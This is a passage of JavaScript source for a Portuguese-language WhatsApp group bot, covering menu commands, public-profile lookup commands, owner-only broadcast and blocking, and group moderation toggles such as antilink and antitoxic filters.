"thumbnail": fs.readFileSync("./GhostMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'menufoto360': {
var unicorn = await getBuffer(picak+'Menu foto360')
sendLucyMessage(from, { 
text: `Ola @${sender.split("@")[0]}\n\n${ephoto360menu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./GhostMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'menunsfw': {
var unicorn = await getBuffer(picak+'Anime NSFW Menu')
sendLucyMessage(from, { 
text: `Ola @${sender.split("@")[0]}\n\n${nsfwmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./GhostMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'animemenu': {
var unicorn = await getBuffer(picak+'Anime Menu')
sendLucyMessage(from, { 
text: `Ola @${sender.split("@")[0]}\n\n${animemenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./GhostMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'stickermenu': {
var unicorn = await getBuffer(picak+'Sticker Menu')
sendLucyMessage(from, { 
text: `Ola @${sender.split("@")[0]}\n\n${stickermenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./GhostMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'databasemenu': {
var unicorn = await getBuffer(picak+'Database Menu')
sendLucyMessage(from, { 
text: `Ola @${sender.split("@")[0]}\n\n${databasemenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./GhostMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
/*case 'iamenu': {
var unicorn = await getBuffer(picak+'OpenAI Menu')
Lucy.sendMessage(m.chat, { 
text: `Ola `,
contextInfo:{
        externalAdReply:{
            thumbnail:    
        }

    },
})
}
break*/
case 'friend':
case 'searchfriend':{

let teman = pickRandom(Ghostverifieduser)
setTimeout(() => {
GhostStickWait()
}, 1000)
setTimeout(() => {
replygcGhost('Conseguiu Obter Uma Pessoa')
}, 5000)
setTimeout(() => {
Lucy.sendMessage(from, {text: `Aqui @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
}
break
case 'request': case 'reportbug': {
	if (!text) return replygcGhost(`Exemplo : ${prefix + command} o comando hi dev play não está funcionando`)
            textt = `*| PEDIDO/ERRO |*`
            teks1 = `\n\n*Do utilizador* : @${
   m.sender.split("@")[0]
  }\n*Solicitação/Bug* : ${text}`
            teks2 = `\n\n*Esse ${pushname},Sua solicitação foi encaminhada para meus proprietários*.\n*Por favor, aguarde...*`
            for (let i of owner) {
                Lucy.sendMessage(i + "@s.whatsapp.net", {
                    text: textt + teks1,
                    mentions: [m.sender],
                }, {
                    quoted: m,
                })
            }
            Lucy.sendMessage(m.chat, {
                text: textt + teks2 + teks1,
                mentions: [m.sender],
            }, {
                quoted: m,
            })

        }
        break
case 'q': case 'quoted': {
if (!m.quoted) return replygcGhost('Responda a Mensagem!!')
let Ghostquotx= await Lucy.serializeM(await m.getQuotedObj())
if (!Ghostquotx.quoted) return replygcGhost('A mensagem que você está respondendo não foi enviada pelo bot')
await Ghostquotx.quoted.copyNForward(m.chat, true)
}
break
case 'igstalk2':{

if (!q) return replygcGhost(`Exemplo ${prefix+command} flavio_tsj`)
GhostStickWait()
const aj = await igstalk(`${q}`)
Lucy.sendMessage(m.chat, { image: { url : aj.profile }, caption: 
`*/ Perseguidor do Instagram \\*

Nome completo : ${aj.fullname}
Nome de usuário : ${aj.username}
Publicar : ${aj.post}
Seguidores : ${aj.followers}
Seguindo : ${aj.following}
Bio : ${aj.bio}` }, { quoted: m } )
}
break
case 'ffstalk':{

if (!q) return replygcGhost(`Exemplo ${prefix+command} 946716486`)
GhostStickWait()
eeh = await ffstalk.ffstalk(`${q}`)
replygcGhost(`*/ Perseguidor Free Fire \\*

Id : ${eeh.id}
Apelido : ${eeh.nickname}`)
}
break
case 'mlstalk': {

if (!q) return replygcGhost(`Exemplo ${prefix+command} 530793138|8129`)
GhostStickWait()
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
replygcGhost(`*/ Mobile Legend Stalker \\*

Nome de usuário : ${dat.userName}
Id : ${q.split("|")[0]}
zona de identificação: ${q.split("|")[1]}`)
}
break
case 'npmstalk':{
if (!q) return replygcGhost(`Exemplo ${prefix+command} Ghostapi`)
GhostStickWait()
eha = await npmstalk.npmstalk(q)
replygcGhost(`*/ Npm perseguidor \\*

Nome : ${eha.name}
Versão mais recente : ${eha.versionLatest}
Versão Publicada : ${eha.versionPublish}
atualização de versão : ${eha.versionUpdate}
Últimas Dependências : ${eha.latestDependencies}
Publicar dependências : ${eha.publishDependencies}
Horário de Publicação : ${eha.publishTime}
Última Hora de Publicação : ${eha.latestPublishTime}`)
}
break
case 'ghstalk': case 'githubstalk':{
if (!q) return replygcGhost(`Exemplo ${prefix+command} Ghost`)
GhostStickWait()
aj = await githubstalk.githubstalk(`${q}`)
Lucy.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Perseguidor do Github \\*

Nome de usuário : ${aj.username}
Apelido : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
contador : ${aj.nodeId}
Perfil de url : ${aj.profile_pic}
Url Github : ${aj.url}
Tipo : ${aj.type}
Administrador : ${aj.admin}
Empresa : ${aj.company}
blog : ${aj.blog}
Localização : ${aj.location}
E-mail : ${aj.email}
Repo Público : ${aj.public_repo}
Síntese Pública : ${aj.public_gists}
Seguidores : ${aj.followers}
Seguindo : ${aj.following}
Criado em : ${aj.ceated_at}
Atualizado em : ${aj.updated_at}` }, { quoted: m } )
}
break
case 'ss': case 'ssweb': {
if (!q) return replygcGhost(`Exemplo ${prefix+command} link`)
GhostStickWait()
let krt = await scp1.ssweb(q)
Lucy.sendMessage(from,{image:krt.result,caption:mess.succes}, {quoted:m})
}
break
case 'join': {
if (!GhostTheCreator) return GhostStickOwner()
if (!text) return replygcGhost(`Exemplo ${prefix+command} linkgp`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcGhost('Link inválido!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await Lucy.groupAcceptInvite(result)
await replygcGhost(`Feito`)
}
break
case 'poll': {
	if (!GhostTheCreator) return GhostStickOwner()
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
                return await replygcGhost(`Mencione a pergunta e pelo menos 2 opções\nExemplo: ${prefix}poll Quem é o melhor administrador?|Ghost,Lucy`)
            let options = []
            for (let i of opt.split(',')) {
                options.push(i)
            }
            await Lucy.sendMessage(m.chat, {
                poll: {
                    name: poll,
                    values: options
                }
            })
        }
        break
case 'toonce': case 'toviewonce': { 
if (!quoted) return replygcGhost(`Reply Image/Video`)
GhostStickWait()
if (/image/.test(mime)) {
anuan = await Lucy.downloadAndSaveMediaMessage(quoted)
Lucy.sendMessage(m.chat, {image: {url:anuan}, caption: `Here you go!`, fileLength: "999", viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anuanuan = await Lucy.downloadAndSaveMediaMessage(quoted)
Lucy.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Here you go!`, fileLength: "99999999", viewOnce : true},{quoted: m })
}
}
break
case 'fliptext': {
if (args.length < 1) return replygcGhost(`Example:\n${prefix}fliptext ${ownername}`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
replygcGhost(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
}
break
            case 'listpc': {
                 let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `${themeemoji} *PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
                 for (let i of anulistp) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `${themeemoji} *Name :* ${nama}\n${themeemoji} *User :* @${i.split('@')[0]}\n${themeemoji} *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 Lucy.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case 'listgc': {
                 let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `${themeemoji} *GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`
                 for (let i of anulistg) {
                     let metadata = await Lucy.groupMetadata(i)
                     teks += `${themeemoji} *Name :* ${metadata.subject}\n${themeemoji} *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n${themeemoji} *ID :* ${metadata.id}\n${themeemoji} *Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n${themeemoji} *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 Lucy.sendTextWithMentions(m.chat, teks, m)
             }
             break
             
            case 'bctext': case 'broadcasttext': case 'broadcast': {
			    if (!GhostTheCreator) return GhostStickOwner()
		            if (!q) return replygcGhost(`Digite o texto`)
		                            const data = await store.chats.all()
                            for (let i of data) {
                               Lucy.sendMessage(i.id, {text: `${ownername}'Transmissão\n\nMensagem : ${q}` })
                               await sleep(1000)
                            }
                            }
                            break
                            case 'broadcastimage': case 'bcimage': case 'broadcastvideo': case 'broadcastvid':
if(!GhostTheCreator) return GhostStickOwner()
        if (!q) return replygcGhost(`Digite o texto`)
        let getGroups = await Lucy.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
        let Ghostcast = groups.map(v => v.id)
        replygcGhost(` Transmitindo em ${Ghostcast.length} Bate-papo em grupo, em ${Ghostcast.length * 1.5} segundos`)
        for (let i of Ghostcast) {
let txt = `${ownername}'Transmissão\n\n Mensagem : ${q}`
if(/image/.test(mime)) {
let media = await quoted.download()
await Lucy.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
}
if(/video/.test(mime)){
let media = await quoted.download()
await Lucy.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
}
            }
        replygcGhost(`Transmitido com sucesso em ${Ghostcast.length} Grupos`)      
        break
case 'block': case 'ban': {
		if (!GhostTheCreator) return GhostStickOwner()
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await Lucy.updateBlockStatus(users, 'block')
		await replygcGhost(`Feito`)
	}
	break
        case 'unblock': case 'unban': {
		if (!GhostTheCreator) return GhostStickOwner()
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await Lucy.updateBlockStatus(users, 'unblock')
		await replygcGhost(`Feito`)
	}
	break
case 'listblock': case 'listban': case 'blocklist': case 'banlist': {
	const lisben = "Total Block: " + banUser.length
	replygcGhost(lisben)
	}
	break
case 'afk': {
if (!m.isGroup) return GhostStickGroup()
if (!text) return replygcGhost(`Exemplo ${prefix+command} quero dormir`)
let user = global.db.users[m.sender]
user.afkTime = + new Date
user.afkReason = args.join(" ")
replygcGhost(`${m.pushName} Ficou AFK\nMotivo : ${args.join(" ") ? args.join(" ") : ''}`)
}
break
case 'resetlinkgc':
case 'resetlinkgroup':
case 'resetlinkgrup':
case 'revoke':
case 'resetlink':
case 'resetgrouplink':
case 'resetgclink':
case 'resetgruplink': {
if (!m.isGroup) return GhostStickGroup()
if (!isBotAdmins) return GhostStickBotAdmin()
if (!isAdmins && !GhostTheCreator) return GhostStickAdmin()
Lucy.groupRevokeInvite(m.chat)
}
break
            case 'react': {
                if (!GhostTheCreator) return GhostStickOwner()
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                Lucy.sendMessage(m.chat, reactionMessage)
            }
            break
case 'grupo': case 'editinfo': {
if (!m.isGroup) return GhostStickGroup()
if (!isAdmins && !GhostTheCreator) return GhostStickAdmin()
if (!isBotAdmins) return GhostStickBotAdmin()
if (!q) return replygcGhost(`Enviar pedidos ${command} opções\nOpções: fechar e abrir\nExemplo : ${command} fechar`)
if (args[0] == 'fechar') {
Lucy.groupSettingUpdate(from, 'announcement')
replygcGhost(`Sucesso permite que apenas administradores enviem mensagens para este grupo`)
} else if (args[0] == 'abrir') {
Lucy.groupSettingUpdate(from, 'not_announcement')
replygcGhost(`O sucesso permite que todos os participantes enviem mensagens para este grupo`)
} else {
replygcGhost(`Digite o comando ${command} opções\nOpções : Fechar e abrir\nExemplo : ${command} fechar`)
}}
break
case 'autosticker':
            case 'autosticker':
if (!isAdmins && !GhostTheCreator) return GhostStickAdmin()
if (args.length < 1) return replygcGhost('digite autosticker on para ligar\ndigite autosticker off para desligar')
if (args[0]  === 'on'){
if (isAutoSticker) return replygcGhost(`Já ativado`)
autosticker.push(from)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
replygcGhost('adesivo automático ativado')
} else if (args[0] === 'off'){
let anuticker1 = autosticker.indexOf(from)
autosticker.splice(anuticker1, 1)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
replygcGhost('adesivo automático desativado')
}
break
case 'antivirus': case 'antivirtex': {
if (!m.isGroup) return GhostStickGroup()
if (!isBotAdmins) return GhostStickBotAdmin()
if (!isAdmins && !GhostTheCreator) return GhostStickAdmin()
if (args[0] === "on") {
if (antiVirtex) return replygcGhost('Already activated')
ntvirtex.push(from)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
replygcGhost('Success in turning on antivirus in this group')
var groupe = await Lucy.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Lucy.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNo body is allowed to send virus in this group, member who send will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiVirtex) return replygcGhost('Already deactivated')
let off = ntvirtex.indexOf(from)
ntvirtex.splice(off, 1)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
replygcGhost('Success in turning off antivirus this group')
} else {
  await replygcGhost(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'nsfw': {
if (!m.isGroup) return GhostStickGroup()
if (!isBotAdmins) return GhostStickBotAdmin()
if (!isAdmins && !GhostTheCreator) return GhostStickAdmin()
if (args[0] === "on") {
if (AntiNsfw) return replygcGhost('Already activated')
ntnsfw.push(from)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
replygcGhost('Success in turning on nsfw in this group')
var groupe = await Lucy.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Lucy.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNsfw(not safe for work) feature has been enabled in this group, which means one can access sexual graphics from the bot!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfw) return replygcGhost('Already deactivated')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
replygcGhost('Success in turning off nsfw in this group')
} else {
  await replygcGhost(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
  case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
if (!m.isGroup) return GhostStickGroup()
if (!isBotAdmins) return GhostStickBotAdmin()
if (!isAdmins && !GhostTheCreator) return GhostStickAdmin()
if (args[0] === "on") {
if (AntiLinkYoutubeVid) return replygcGhost('Already activated')
ntilinkytvid.push(from)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
replygcGhost('Success in turning on youtube video antilink in this group')
var groupe = await Lucy.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Lucy.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube video link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeVid) return replygcGhost('Already deactivated')
let off = ntilinkytvid.indexOf(from)
ntilinkytvid.splice(off, 1)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
replygcGhost('Success in turning off youtube video antilink in this group')
} else {
  await replygcGhost(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
    case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
if (!m.isGroup) return GhostStickGroup()
if (!isBotAdmins) return GhostStickBotAdmin()
if (!isAdmins && !GhostTheCreator) return GhostStickAdmin()
if (args[0] === "on") {
if (AntiLinkYoutubeChannel) return replygcGhost('Already activated')
ntilinkytch.push(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
replygcGhost('Success in turning on youtube channel antilink in this group')
var groupe = await Lucy.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Lucy.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube channel link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeChannel) return replygcGhost('Already deactivated')
let off = ntilinkytch.indexOf(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
ntilinkytch.splice(off, 1)
replygcGhost('Success in turning off youtube channel antilink in this group')
} else {
  await replygcGhost(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
      case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
if (!m.isGroup) return GhostStickGroup()
if (!isBotAdmins) return GhostStickBotAdmin()
if (!isAdmins && !GhostTheCreator) return GhostStickAdmin()
if (args[0] === "on") {
if (AntiLinkInstagram) return replygcGhost('Already activated')
ntilinkig.push(from)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
replygcGhost('Success in turning on instagram antilink in this group')
var groupe = await Lucy.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Lucy.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the instagram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkInstagram) return replygcGhost('Already deactivated')
let off = ntilinkig.indexOf(from)
ntilinkig.splice(off, 1)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
replygcGhost('Success in turning off instagram antilink in this group')
} else {
  await replygcGhost(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
        case 'antilinkfacebook': case 'antilinkfb': {
if (!m.isGroup) return GhostStickGroup()
if (!isBotAdmins) return GhostStickBotAdmin()
if (!isAdmins && !GhostTheCreator) return GhostStickAdmin()
if (args[0] === "on") {
if (AntiLinkFacebook) return replygcGhost('Already activated')
ntilinkfb.push(from)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
replygcGhost('Success in turning on facebook antilink in this group')
var groupe = await Lucy.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Lucy.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the facebook link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return replygcGhost('Already deactivated')
let off = ntilinkfb.indexOf(from)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
replygcGhost('Success in turning off facebook antilink in this group')
} else {
  await replygcGhost(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
          case 'antilinktelegram': case 'antilinktg': {
if (!m.isGroup) return GhostStickGroup()
if (!isBotAdmins) return GhostStickBotAdmin()
if (!isAdmins && !GhostTheCreator) return GhostStickAdmin()
if (args[0] === "on") {
if (AntiLinkTelegram) return replygcGhost('Already activated')
ntilinktg.push(from)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
replygcGhost('Success in turning on telegram antilink in this group')
var groupe = await Lucy.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Lucy.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the telegram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTelegram) return replygcGhost('Already deactivated')
let off = ntilinktg.indexOf(from)
ntilinktg.splice(off, 1)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
replygcGhost('Success in turning off telegram antilink in this group')
} else {
  await replygcGhost(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
            case 'antilinktiktok': case 'antilinktt': {
if (!m.isGroup) return GhostStickGroup()
if (!isBotAdmins) return GhostStickBotAdmin()
if (!isAdmins && !GhostTheCreator) return GhostStickAdmin()
if (args[0] === "on") {
if (AntiLinkTiktok) return replygcGhost('Already activated')
ntilinktt.push(from)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
replygcGhost('Success in turning on tiktok antilink in this group')
var groupe = await Lucy.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Lucy.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the tiktok link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTiktok) return replygcGhost('Already deactivated')
let off = ntilinktt.indexOf(from)
ntilinktt.splice(off, 1)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
replygcGhost('Success in turning off tiktok antilink in this group')
} else {
  await replygcGhost(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
            case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
if (!m.isGroup) return GhostStickGroup()
if (!isBotAdmins) return GhostStickBotAdmin()
if (!isAdmins && !GhostTheCreator) return GhostStickAdmin()
if (args[0] === "on") {
if (AntiLinkTwitter) return replygcGhost('Already activated')
ntilinktwt.push(from)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
replygcGhost('Success in turning on twitter antilink in this group')
var groupe = await Lucy.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Lucy.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the twitter link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTwitter) return replygcGhost('Already deactivated')
let off = ntilinktwt.indexOf(from)
ntilinktwt.splice(off, 1)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
replygcGhost('Success in turning off twitter antilink in this group')
} else {
  await replygcGhost(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
              case 'antilinkall': {
if (!m.isGroup) return GhostStickGroup()
if (!isBotAdmins) return GhostStickBotAdmin()
if (!isAdmins && !GhostTheCreator) return GhostStickAdmin()
if (args[0] === "on") {
if (AntiLinkTwitter) return replygcGhost('Already activated')
ntilinkall.push(from)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
replygcGhost('Success in turning on all antilink in this group')
var groupe = await Lucy.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Lucy.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send any link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return replygcGhost('Already deactivated')
let off = ntilinkall.indexOf(from)
ntilinkall.splice(off, 1)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
replygcGhost('Success in turning off all antilink in this group')
} else {
  await replygcGhost(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antitoxic': case 'antibadword': {
if (!m.isGroup) return GhostStickGroup()
if (!isBotAdmins) return GhostStickBotAdmin()
if (!isAdmins && !GhostTheCreator) return GhostStickAdmin()
if (args[0] === "on") {
if (antiToxic) return replygcGhost('Already activated')
nttoxic.push(from)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
replygcGhost('Success in turning on antitoxic in this group')
var groupe = await Lucy.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Lucy.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to use bad words in this group, one who uses will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiToxic) return replygcGhost('Already deactivated')
let off = nttoxic.indexOf(from)
nttoxic.splice(off, 1)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
replygcGhost('Success in turning off antitoxic in this group')
} else {
  await replygcGhost(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antiwame': {
if (!m.isGroup) return GhostStickGroup()
if (!isBotAdmins) return GhostStickBotAdmin()
if (!isAdmins && !GhostTheCreator) return GhostStickAdmin()
if (args[0] === "on") {
if (antiWame) return replygcGhost('Already activated')
ntwame.push(from)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
replygcGhost('Success in turning on antiwame in this group')
var groupe = await Lucy.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Lucy.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send wa.me in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiWame) return replygcGhost('Already deactivated')
let off = nttoxic.indexOf(from)
ntwame.splice(off, 1)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
replygcGhost('Success in turning off antiwame in this group')
} else {
  await replygcGhost(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antilinkgc': {
if (!m.isGroup) return GhostStickGroup()
if (!isBotAdmins) return GhostStickBotAdmin()
if (!isAdmins && !GhostTheCreator) return GhostStickAdmin()
if (args[0] === "on") {
if (Antilinkgc) return replygcGhost('Already activated')
ntlinkgc.push(from)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
replygcGhost('Success in turning on antiwame in this group')
var groupe = await Lucy.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
